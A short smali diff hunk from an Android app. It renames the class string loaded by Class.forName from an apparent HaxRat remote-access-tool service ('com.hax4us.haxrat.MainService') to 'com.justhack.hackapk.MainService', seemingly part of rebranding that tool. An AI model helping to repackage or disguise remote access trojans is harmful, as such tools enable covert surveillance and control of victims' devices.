@@ -225,7 +225,7 @@
     move-object v7, v0
 
     :try_start_0
-    const-string v8, "com.hax4us.haxrat.MainService"
+    const-string v8, "com.justhack.hackapk.MainService"
 
     invoke-static {v8}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
     :try_end_0
